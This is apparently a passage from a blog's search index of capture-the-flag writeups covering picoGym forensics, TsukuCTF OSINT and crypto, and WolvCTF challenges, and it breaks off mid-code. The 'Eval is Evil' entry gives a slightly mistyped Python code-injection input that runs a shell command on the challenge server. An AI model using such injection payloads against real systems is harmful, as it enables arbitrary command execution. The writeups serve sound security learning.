63 &gt; c … the numbers represent the hex of the character so this must mean we are closer to the flag. Rather than decoding manually I used a bash command.xxd -r -p flagI got the Flag!Flag: picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_3c79c5ba}"
  },
  
  {
    "title": "picoGym Forensics - Easy writeups",
    "url": "/posts/picogym_forensics_easy_writeup/",
    "categories": "CTF, PicoCTF",
    "tags": "ctf, writeups, cybersecurity, forensics, steganography",
    "date": "2025-05-08 11:00:00 +0530",
    





    
    "snippet": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice pl...",
    "content": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice platform, participants learn to overcome sets of challenges from six domains of cybersecurity including general skills, cryptography, web exploitation, forensics, etc. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cybersecurity skills in a safe environment.Whether you are a cybersecurity professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often.This is their Official webpage - https://picoctf.org/This is their url for picoGym - https://play.picoctf.org/practiceEasyDISKO 1Explanation:We are given with a disk image named - disko-1.dd.gz, it looks like it compressed using gzip so I decompressed it using the below command.gzip -d disko-1.dd.gzIt returned disko-1.dd which is a - DOS/MBR boot sector, code offset 0x58+2, OEM-ID “mkfs.fat”, Media descriptor 0xf8, sectors/track 32, heads 8, sectors 102400 (volumes &gt; 32 MB), FAT (32 bit), sectors/FAT 788, serial number 0x241a4420, unlabeled (by file command).I used exiftool but couldn’t find anything helpful. So I thought of using strings with grep to find the flag. I used the below command.strings disko-1.dd | grep \"picoCTF\"I got the flag!Flag: picoCTF{1t5_ju5t_4_5tr1n9_e3408eef}REDExplanation:We are given an image - red.png, which when opened is full of red color. I tried using exiftool and strings, but no progress. So I used zsteg thinking something maybe hidden using steganography.we can see some base64 text, which is the same string repeated three times continuously. So lets decode it using the below command.echo \"cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==\" | base64 -dI got the flag!Flag: picoCTF{r3d_1s_th3_ult1m4t3_cur3_f0r_54dn355_}Ph4nt0m 1ntrud3rExplanation:They have given us a pcap file. When opened the pcap file I saw base64 strings in the TCP segment data of each log. They are in all the logs, but what I found is not all of them are base64. When filtered the time in ascending order, we can find legit base64 strings at the last logs. Now by collecting them we got:cGljb0NURg==ezF0X3c0cw==bnRfdGg0dA==XzM0c3lfdA==YmhfNHJfMw==NmY0YTY2Ng==fQ==which when decoded using base64, gives us the flag.I got the flag!Flag: picoCTF{1t_w4snt_th4t_34sy_tbh_4r_36f4a666}VerifyExplanation:After launcing the instance, we will be provided with a custom-port SSH login command and a password. Let’s try to connect to the shell using the given command and enter the password. You will be connected to the shell.After successfully connecting, we will be entering a challenge shell. Let’s try to check what are its contents using - ls command. It returns the following output:checksum.txt    decrypt.sh  filesAfter checking each of them using file command, it turns out:  checksum.txt is a text file  decrypt.sh is a shell script  files is a directory consisting of mutiple files.From the description of the challenge, we can understand that - the author says they are many fake flag, so to keep track of the real flag, he provides the SHA-256 hash of the real flag file and a decrypt file. So, what we can do is compare the SHA-256 hash of all the files in the - files directory with the hash provided in the checksum.txt.(What is SHA-256 hash? SHA-256 is a cryptographic hash function that produces a fixed 256-bit output from any input. SHA stands for Secure Hash Algorithm. It is deterministic, that means same input always gives the same hash and a checksum is another word for the hash output.)Using the below commands:sha256sum files/*The above command generate the checksum of all the files in the files directory. Now we need to compare the output generated that is the checksum of all the files with the provided checksum of checksum.txt to get the real flag.sha256sum files/* | grep -f checksum.txtThe above command will return the checksum and file name. Now checking the file using file commands returns the following:files/451fd69b: openssl enc'd data with salted passwordIt looks like it is encrypted, lets decrypt it using the decrypt.sh script provided. After checking the contents of decrypt.sh you can know how it works../decrypt.sh files/451fd69bAfter using the above we will get the flag.I got the flag!Flag: picoCTF{trust_but_verify_451fd69b}Scan SurpriseExplanation:After launcing the instance, you will be provided with custom-port SSH command and password. Connect to the shellAfter connecting, you will enter into the shell and a QR will be given. By using the - ls command in the current directory, you can see there is a file called flag.png. It looks like flag.png is the QR code. Now lets analyze the QR code using the below command.zbarimg flag.pngThis will return some data and you can see the flag.I got the flag!This challenge can also be solved using mobile QR code scanner and other online QR code scanners. You don’t need to connect to the shell to solve this challenge, you can also solve it by just downloading the challenge.zip provided, unzip it and go to the flag.png directory, and either scan or using the above command to get the flag.Flag: picoCTF{p33k_@_b00_d4ca652e}Secret of the PolyglotExplanation:The description says something about file types so first download the file.So they have given us a file named - flag2of2-final.pdf. After opening the pdf I found the flag😮……….no, the half of it, the last half. I guess we will have to find out the other half.Now after using the file command on the given pdf file. It turns out, it is a png file. so I changed the file extension using move command.file flag2of2-final.pdfmv flag2of2-final.pdf flag2of2-final.pngNow after opening the png, I got the first half of the flag. Hence combining the first half and the last half we got before will give us the flag.I got the flag!Flag: picoCTF{f1u3n7_1n_pn9_&amp;_pdf_90974127}CanYouSeeExplanation:After downloading, we will get a - unknown.zip file. After unzipping we will get a jpg - ukn_reality.jpg. Now lets analysing it using few commands like file, exiftool and binwalk etc.,When used exiftool, it returns a suspective output.It looks like the value of - Attribution URL is a base64 encoded string, lets decrypt it.echo \"cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg==\" | base64 -dI got the flag!Flag: picoCTF{ME74D47A_HIDD3N_deca06fb}InformationExplanantion:So they have given us a file - cat.jpg saying files can be changed in a secret way.After using file, binwalk, strings and xxd commands I couldn’t find anything suspective but when I used exiftool command the got this output:exiftool cat.jpgNow looking at the value of the license, it looks sus, I think its base64 or something. Let’s try the below command.echo \"cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9\" | base64 -dI got the flag!Flag: picoCTF{the_m3tadata_1s_modified}Glory of the GardenExplanation:You can see the “garden” text in the description is colored blue, so a link must be attached to it. Aftering clicking on it, an image named - garden.jpg will be downloaded.After analysing the image using - file, exiftool and binwalk commands I couldn’t find anything. But after using the strings command on the jpg, it returned the flag in the last line.strings garden.jpgI got the flag!Flag: picoCTF{more_than_m33ts_the_3y33dd2eEF5}"
  },
  
  {
    "title": "TsukuCTF 2025 writeups",
    "url": "/posts/tsukuctf_2025_writeup/",
    "categories": "CTF, TsukuCTF",
    "tags": "ctf, writeups, cybersecurity, osint, pwn, cryptography",
    "date": "2025-05-04 11:00:00 +0530",
    





    
    "snippet": "TsukuCTF 2025About TsukuCTF:TsukuCTF is an annual CTF hosted by TaruTaruThis is a CTF with Japanese OSINT as the main genre. There are a few other genres mixed in as well..  TsukuCTF 2025 will be h...",
    "content": "TsukuCTF 2025About TsukuCTF:TsukuCTF is an annual CTF hosted by TaruTaruThis is a CTF with Japanese OSINT as the main genre. There are a few other genres mixed in as well..  TsukuCTF 2025 will be held online (competition URL: https://tsukuctf.org/ ).  The duration of the event is 24h00m from 12:00(JST) on 05/03/2025 to 11:59(JST) on 05/04/2025.  Genres will include OSINT, Web, Pwn, Crypto, etc.  Maximum number of players per team is 4  The event was conducted online from Sat, 03 May 2025, 08:30 IST — Sun, 04 May 2025, 08:30 IST.This is their CTF webpage - https://tsukuctf.org/This is their CTFtime profile - https://ctftime.org/event/2769/tsukushiWelcomeTranslation:Flags are listed in the “announcements” channel of the official TsukuCTF Discord. Flag Format: TsukuCTF25{}Explanation:As the description said the flag is in the anncouncement channel of the discord server. I head over to the discord server, checked out the announcements. I found the flag in the same message they have announced the CTF has started.I got the flag!Flag: TsukuCTF25{welcome_to_TsukuCTF_2025!}OSINTcurveTranslation:These are some of the famous places in Japan. Can you spot anything unusual about this photo? The flag is the website domain for this place. Example: TsukuCTF25{example.com}Source:Explanation:After downloading, I used google lens on the image. After looking at few images I understood that the image is of an escalator in Landmark Tower (Yokohama), Japan. Searched for it in google, found it’s official websiteI got the flag!Flag: TsukuCTF25{yokohama-landmark.jp}destroyedTranslation:Identify the school in the photo of this Telegram post. The flag format should be the coordinates of the location rounded to the nearest 4 decimal places and written in the format TsukuCTF25{latitude_longitude} to the nearest 3 decimal places. Example: TsukuCTF25{12.345_123.456}Warning: In the process of solving this problem, you may see direct images related to war.23:14 GMT+9 Update: Flag addedSource:Telegram LinkExplanation:After visiting the telegram channel, looked over the images, checked the description of the post. Found that it is Stepne Community Gymnasium and from the flag emoji it is in Ukraine. So the war must be between Russia and Ukraine. We can see multiple news pages about the gymnasium when we use google lens on all the provided images.After using google maps and searching over Stepne in Zaporizhzhia Oblast looking for the gymnasium for quite a period of time. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{47.797_35.306}riderTranslation:Footprints that walk far away and disappear into the evening darkness, The glittering streetlights decorate the city at night, A group of motorbikes pass by on the road nearby, Only the sound of the wind remains, In the light and shadow, I suddenly stop and wonder, Where am I now?The flag format is TsukuCTF25{latitude_longitude} of the location where this person is standing. However, the latitude and longitude are rounded down to the fifth decimal place.View Hint: This poem has no meaning.Source:Explanation:After looking at the image and using google lens, found some restaurant named “OTI fried chicken “ which is a restaurant chain in Indonesia.Using google maps and the restaurant’s official webpage, I looked over its branches. After looking at some of the branches came across a branch which has a panda logo on the side of it and the same street light from that in the image. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{-7.3189_110.4970}buildingsTranslation:Once that building is built, the sky will probably get narrower again.The flag format is TsukuCTF25{latitude_longitude} of the location where this person is standing. Note that the latitude and longitude are rounded down to five decimal places.Source:Explanation:Used Google lens on the image. It provided me with two bulding names - Global Front tower and ロイヤルパークス品川 (Royal Parks Shinagawa). They are both from same place that is - Minato City, Tokyo, Japan.Using Google Maps searched for the places. Found the buildings that resembles those in the image. As the photo is taken on a road, I followed the road and observed the buildings to position them just like how the image looks. I got to the position where the photo was taken as everything matches perfectly. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{35.6318_139.7431}powerTranslation:I’ve felt the power.The flag format is TsukuCTF25{latitude_longitude} of the location where this person is standing. Note that the latitude and longitude are rounded down to five decimal places.Source:Explanation:Looking at the image, it is tactile map of someplace in Japan( as the image contains a japanese character). It contains a braille etched metal plate.Used Google lens on the image, I searched the image by cropping it various ways after I cropped it full and added “Japan” to the search, looking over the results, I found the image which resembles the photo. The image is from a stockphoto website. After reading the description, it seems that the image is of “Taira no Masakado’s Grave”Using google maps went over to the location, looked for the maps, found them. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{35.6872_139.7628}Cryptoa8tsukuctfTranslation:I created a suitable KEY and encrypted it, but the tsukuctf part remains the same…Source:enc.py:import stringplaintext = '[REDACTED]'key = '[REDACTED]'#    &lt;plaintext&gt;               &lt;ciphertext&gt;# ...?? tsukuctf, ??... -&gt;  ...aa tsukuctf, hj...assert plaintext[30:38] == 'tsukuctf'# https://ja.wikipedia.org/wiki/%E3%83%B4%E3%82%A3%E3%82%B8%E3%83%A5%E3%83%8D%E3%83%AB%E6%9A%97%E5%8F%B7#%E6%95%B0%E5%BC%8F%E3%81%A7%E3%81%BF%E3%82%8B%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%A8%E5%BE%A9%E5%8F%B7def f(p, k):    p = ord(p) - ord('a')    k = ord(k) - ord('a')    ret = (p + k) % 26    return chr(ord('a') + ret)def encrypt(plaintext, key):    assert len(key) &lt;= len(plaintext)    idx = 0    ciphertext = []    cipher_without_symbols = []    for c in plaintext:        if c in string.ascii_lowercase:            if idx &lt; len(key):                k = key[idx]            else:                k = cipher_without_symbols[idx-len(key)]            cipher_without_symbols.append(f(c, k))            ciphertext.append(f(c, k))            idx += 1                  else:            ciphertext.append(c)    ciphertext = ''.join(c for c in ciphertext)    return ciphertextciphertext = encrypt(plaintext=plaintext, key=key)with open('output.txt', 'w') as f:    f.write(f'{ciphertext=}\\n')output.txtciphertext=\"ayb wpg uujmz pwom jaaaaaa aa tsukuctf, hj vynj? mml ogyt re ozbiymvrosf bfq nvjwsum mbmm ef ntq gudwy fxdzyqyc, yeh sfypf usyv nl imy kcxbyl ecxvboap, epa 'avb' wxxw unyfnpzklrq.\"Explanation:After checking the encryption python file it seems that this challenge is based on custom autokey Vigenère cipher. Based on the functions and the contents of output.txt, I have written a decrpytion python code:import stringciphertext = \"ayb wpg uujmz pwom jaaaaaa aa tsukuctf, hj vynj? mml ogyt re ozbiymvrosf bfq nvjwsum mbmm ef ntq gudwy fxdzyqyc, yeh sfypf usyv nl imy kcxbyl ecxvboap, epa 'avb' wxxw unyfnpzklrq.\"def f_inv(c, k):    c = ord(c) - ord('a')    k = ord(k) - ord('a')    p = (c - k + 26) % 26    return chr(ord('a') + p)def decrypt(ciphertext, known_plaintext_segment, segment_position):    idx = 0    plain = []    cipher_without_symbols = []    decrypted_key = []    letters_only = [c for c in ciphertext if c in string.ascii_lowercase]    for i in range(len(known_plaintext_segment)):        c = letters_only[segment_position + i]        p = known_plaintext_segment[i]        k = (ord(c) - ord(p)) % 26        k = chr(ord('a') + k)        decrypted_key.append(k)    idx = 0    key = decrypted_key    for c in ciphertext:        if c in string.ascii_lowercase:            if idx &lt; len(key):                k = key[idx]            else:                k = cipher_without_symbols[idx - len(key)]            p = f_inv(c, k)            cipher_without_symbols.append(c)            plain.append(p)            idx += 1        else:            plain.append(c)    return ''.join(plain), ''.join(decrypted_key)lower_only = [c for c in ciphertext if c in string.ascii_lowercase]segment = \"tsukuctf\"segment_position = 30  # Based on the assertplaintext, key = decrypt(ciphertext, segment, segment_position)print(\"Recovered key:\", key)print(\"\\nDecrypted plaintext:\\n\", plaintext)The above code when ran, returns the output:Recovered key: annzbwueDecrypted plaintext: alo xok aqjoy this problem or tsukuctf, or both? the flag is concatenate the seventh word in the first sentence, the third word in the second sentence, and 'fun' with underscores.Based on the decrypted plain text, the flag is seventh-word(firstSentence)_third-word(secondSentence)_fun.I got the flag!Flag: TsukuCTF25{tsukuctf_is_fun}PQC0Translation:I tried using PQC (Post-Quantum Cryptography)!Source:prob.py# REQUIRED: OpenSSL 3.5.0import osfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom flag import flag# generate private keyos.system(\"openssl genpkey -algorithm ML-KEM-768 -out priv-ml-kem-768.pem\")# generate public keyos.system(\"openssl pkey -in priv-ml-kem-768.pem -pubout -out pub-ml-kem-768.pem\")# generate shared secretos.system(\"openssl pkeyutl -encap -inkey pub-ml-kem-768.pem -secret shared.dat -out ciphertext.dat\")with open(\"priv-ml-kem-768.pem\", \"rb\") as f:    private_key = f.read()print(\"==== private_key ====\")print(private_key.decode())with open(\"ciphertext.dat\", \"rb\") as f:    ciphertext = f.read()print(\"==== ciphertext(hex) ====\")print(ciphertext.hex())with open(\"shared.dat\", \"rb\") as f:    shared_secret = f.read()encrypted_flag = AES.new(shared_secret, AES.MODE_ECB).encrypt(pad(flag, 16))print(\"==== encrypted_flag(hex) ====\")print(encrypted_flag.hex())output.txt==== private_key ====-----BEGIN PRIVATE KEY-----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-----END PRIVATE KEY-----==== ciphertext(hex) ====83daaca5593e84b6b902645a25920e6f60c7c72ca8101b56b878434f20cd838f0f2086d3385e528f2687625a38822b74097d109f6d7b3ac730b7fd6a47c988324a6f3b3133b868d3db8b473b597151df4e4091e3ebf77843b6f84c420ffea899f6465d60ffabb3e1de10da2055a43abff172ecf44130a8f3663ff5c39a61d6a10d13cd72f0f289815c75c17687fd35a82503cfbdf790c5164ea739e0f34e7b23cd017a493bf60f8d0d083ce50257bdff7ec5a882e8c1132fc0ef7fed7543d74eb17624266413093d8ef1b80eb94ce97af443fa479a131b59393495d45f8b79271105abed644a423bad0a76bb86de6c5303c2f2eaf36b9d517201d3c670b46fde3e9282346abee87b9aea188936abef98ab9a10914007a26f6f05ccb007f0784870444e4c49002e256b8acd2842ac5d574b1b8592949c9e615882a811a101262713b3c673a885b44a4eac81000746a7ea7ec7e02b4511dd12f57dca62fb263cdc1dd9a1e5599b7c4823d02811acb4c51dff09060591be3370e250246ccd15dcd29ed037805a478ff87edecf184db4f5ce2f929212fc36b9f9d22fec6a5ca69d966ca10fff9d0aac6fcb197fdf03ddd5d32fcff27200f96d3eb7e6628df601874b83ead5e2bb965fb02d01e5e9593938b5ad49e473998fad055010fa8caf04366cab97838cbeed94d9b3b1051ea79d0e8d2dfae83b96efcc82b81539534d00825f8a22492bfac3869ee52af470a7718ee2149c1aa69377f675f922ac2d79477bdf5788f5af3a4b9bad63838b09c07069b1651416f9631475397e86739502dfd89b4c603bc7ed2c6c8fe46762db2412104c0dfdbf265b4f9dfc95d4e2408f9237e4c37e395fe219254569b48d7e3bd38807285204cb434f3a8e17ce96d95182a38c4e788f6bb7fac129e457f26769b80489d47631033f4d47702fc64649e40bb17818438ce04659ecf440b70e29ab332bf348897e504025250a12aea1297b47e6f6a8b4334152dea44f12dead1c2ae07e944dc214fc15a7eb3eedcbe7528c75daf7891ea59b92c26dd2a8e7d8e8a5e61d621c3c29132fade8a5c03a25fb8918dab80fe1b2ef0ac88a33d1b85f6e09f495813bea33a310e98f74f9286f78e451ef9a43f35f738a0d1148bd427fc51cc5e1da59d6c3ad4531f63b3aacda096d062b73e66b1f5a74d015da0dfb215b52c65203ba2a1c7ca67996081451669989f919b33b4c016faa9e81722dbe2c6132976c997172a34fd95ba6023bb4798b6ebded93deb0f80a493bb4d430b6faf01010f4e14504c8a46213ab749aacd6f0f08dc0157f132859f6d02312ed6c015c6e2cc63c97e6ad6e7408135f45a0e1f4ae9a858c1d7dbd40cf7ac33f74d61a3dfcaa8fda39768e088ead498093d71e930f03d320ef46f47d45995453950d21fba2704486c203789cf616fbf6b7c9f120c06c43ec0548b8a90201aa54e0d756d1c3e5c1e7bf56cc887c8eeaa173229b644da640671872cbcf9a96150c2deafdc7ea5036a9a9fa828ee3558e4e65a988131ea7ab65==== encrypted_flag(hex) ====5f2b9c04a67523dac3e0b0d17f79aa2879f91ad60ba8d822869ece010a7f78f349ab75794ff4cb08819d79c9f44467bdExplanation:Looking at the given encryption source code and output.txt. The code uses ML-KEM-768 (Kyber768) for key encapsulation and AES for encrypting the flag.The provided prob.py script generates an ML-KEM-768 private key: priv-ml-kem-768.pem, derives the corresponding public key: pub-ml-kem-768.pem. Uses the public key to encapsulate a shared secret, producing: ciphertext.dat and shared.dat( the derived shared secret ).To decrypt it, we need the shared secret.For that, from the output.txt the created three files:  Private Key: Save the PEM-formatted private key between the —–BEGIN PRIVATE KEY—– and —–END PRIVATE KEY—– lines into a file named priv-ml-kem-768.pem.  Ciphertext: Convert the hex string under ==== ciphertext(hex) ==== into binary and save it as ciphertext.dat.  Encrypted Flag: Convert the hex string under ==== encrypted_flag(hex) ==== into binary and save it as encrypted_flag.bin.Used OpenSSL to decapsulate the shared secret.openssl pkeyutl -decap -inkey priv-ml-kem-768.pem -in ciphertext.dat -secret shared.datUsed this python script to decrypt the flag:from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadwith open(\"shared.dat\", \"rb\") as f:    shared_secret = f.read()with open(\"encrypted_flag.bin\", \"rb\") as f:    encrypted_flag = f.read()cipher = AES.new(shared_secret, AES.MODE_ECB)decrypted_flag = unpad(cipher.decrypt(encrypted_flag), 16)print(decrypted_flag.decode())I got the flag!Flag: TsukuCTF25{W3lc0me_t0_PQC_w0r1d!!!}"
  },
  
  {
    "title": "WolvCTF 2025 writeups",
    "url": "/posts/wolvctf_2025_writeup/",
    "categories": "CTF, WolvCTF",
    "tags": "ctf, writeups, cybersecurity, forensics, reverse-engineering, pwn, cryptography",
    "date": "2025-03-27 21:45:00 +0530",
    





    
    "snippet": "WolvCTF 2025About WolvCTF:WolvCTF is an annual CTF hosted by WolvSec.WolvSec is a cybersecurity/hacking club at the University of Michigan. The club is composed of undergrads, graduate students, al...",
    "content": "WolvCTF 2025About WolvCTF:WolvCTF is an annual CTF hosted by WolvSec.WolvSec is a cybersecurity/hacking club at the University of Michigan. The club is composed of undergrads, graduate students, alumni, university staff, and local industry professionals who are all focused on creating a fun, friendly, collaborative learning environment for cybersecurity.WolvCTF 2025 is consists of challenges ranging from beginner to hard in difficulty and topics like RevEng, Forensics, OSINT, Web Exploit, Cryptography, Binary Exploit and Misc. The event was conducted online from Sat, 22 March 2025, 04:30 IST — Mon, 24 March 2025, 04:30 IST.This is their CTF webpage - https://wolvctf.io/This is their CTFtime profile - https://ctftime.org/event/2579MiscSanity CheckExplanation:They told us to check out their discord server. So just like many challenges of this type, the flag must be somewhere in the server.While inspecting, the channels in the server we can view the flag stored in the channel topic of “faq” channel.We got the flag!Flag: wctf{m1chigan_NCAA_champi0ns_inc0ming}Eval is EvilExplanation:They have given us a netcat command to connect to a remote server and also a download - dist.tar.gz. As it is gzip compressed and tar compressed, lets decompress it using the below commands:gzip -d dist.tar.gztar -xvf dist.tarelse you can use a one-liner command to completely extract the file contents:tar -xvzf dist.tar.gzNow after extracting the compressed folder you will get this - challenge/chall.py. So what we are given is a python file. Let’s inspect the source code.import randomdef main():        print(\"Let's play a game, I am thinking of a number between 0 and\", 2 ** 64, \"\\n\")    try:        guess = eval(input(\"What is the number?: \"))    except:        guess = 0    correct = random.randint(0, 2**64)        if (guess == correct):        print(\"\\nCorrect! You won the flag!\")        flag = open(\"flag.txt\", \"r\").readline()        print(flag)    else:        print(\"\\nYou lost lol\")main()After inspecting the source code you can understand that the program asks the user enter a number between 0 and 2**64 which is 18,446,744,073,709,551,616 😮. Then evaluates it, if the user entered a valid input, it stores the value in a variable - guess, and compares it to a random valued variable - correct. If the values match then the program is going to print the content of flag.txt. But who is talented enough to guess what random value is generated by the program, right!We can exploit this program using - arbitary code execution ( The user can enter ANY Python code ). We can input the below line as the input, then we can have the contents of flag.txt.__import('os').system(\"cat flag.txt\")Explanation of above command - As there is a possiblity of arbitary code execution, we are inserting a python code as the input. The code consist of os module in Python provides a way to interact with the operating system. It allows your Python program to perform system-level tasks. Which can also mean we can execute system commands. So we are using - cat to read the contents of flag.txt, this will give us the flag.We got the flag!NOTE: If you didn’t get the flag and it shows the error - “cat: flag.txt: no such file or directory”, its because you are running the code in local which has no flag.txt file, when you run the given netcat command, you will get the flag stored in the flag.txt of the remote server.Flag:  wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}Wasm 0Explanation:They have given us a netcat command to connect to a remote server and also a download - dist.tar.gz. To get started we have to first extract the contents of the downloaded compressed folder. As the process is similiar in most of the challanges I won’t be mentioning in every challenge, so please refer to the explanation of Eval is Evil challenge writeup for the process to decompress.After decompressing, we will be provided with three files - 0.js, wasm.js and package.json. I have provided the source code of each file below.const readline = require(\"readline\");const rl = readline.createInterface({    input: process.stdin,    output: process.stdout});let { Builder, parseHex } = require('./wasm.js');function win() {    console.log(\"wctf{redacted-flag}\");}let mod = new Builder();// (type ;0; () -&gt; ())mod.addSection(1, [0x01, 0x60, 0x00, 0x00]);// (func ;0; (import \"i\" \"win\") (type 0))mod.addSection(2, [0x01, 0x01, 0x69, 0x03, 0x77, 0x69, 0x6e, 0x00, 0x00]);// (func ;1; (type 0))...mod.addSection(3, [0x01, 0x00])// (func ;1; (export \"main\") (type 0))mod.addSection(7, [0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x01])rl.question(\"&gt;&gt;&gt; \", 